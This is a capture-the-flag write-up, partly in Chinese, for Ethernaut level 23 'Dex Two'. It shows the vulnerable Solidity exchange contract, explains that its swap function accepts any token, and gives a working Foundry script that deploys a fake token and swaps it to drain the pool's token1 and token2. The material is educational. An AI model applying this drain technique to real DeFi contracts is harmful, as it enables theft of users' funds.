# Ethernaut CTF Writeup

## Level 23 Dex Two

> 題目: https://ethernaut.openzeppelin.com/level/0x18B246421d7484950749CF50155F95BEd11AB785

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

過關條件: 

- drain all balances of token1 and token2 from the DexTwo contract

解法：

- 這題比起上一題，取消了要在 token1 及 token2 之間互換的檢查，因此可以建立一個新的 token 來跟池子做互換，抽乾池子中的 token
    - 發起攻擊：建立第三個 token (MaomaogogoToken for example)，並向池子發送 100 個 MAOMAOGOGO
    - 第一換：100 MAOMAOGOGO -> 100 token1
        > 池中代幣數量： 0 token1, 100 token2, 200 MAOMAOGOGO
    - 第二換：200 MAOMAOGOGO -> 100 token2
        > 池中代幣數量： 0 token1, 0 token2, 400 MAOMAOGOGO

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexTwo} from "../src/level23/DexTwo.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MaomaogogoToken is ERC20 {
    constructor() ERC20("MaomaogogoToken", "MAOMAOGOGO") public {
        _mint(msg.sender, 400);
    }
}
// export RPC_URL=https://sepolia.optimism.io
// export PKEY=0xabc
// forge script script/levelx.s.sol --rpc-url $RPC_URL --private-key $PKEY --tc Attack --broadcast
contract Attack is Script {
    MaomaogogoToken maomaotoken;
    DexTwo target = DexTwo(payable(0xd533f4AC46646Ba49Cd6b7b08836Ba54ee948974));
    address token1 = target.token1();
    address token2 = target.token2();
    function run() public {
        vm.startBroadcast();

        // 佈署代幣
        maomaotoken = new MaomaogogoToken();
        maomaotoken.transfer(address(target),100);
        maomaotoken.approve(address(target),1000);

        // 100 maomaotoken -> 100 token1
        // pool: 0 token1, 100 token2, 200 maomaotoken
        target.swap(address(maomaotoken), token1, 100);
        // 200 maomaotoken -> 100 token2
        // pool: 0 token1, 0 token2, 400 maomaotoken
        target.swap(address(maomaotoken), token2, 200);

        vm.stopBroadcast();
    }
}
```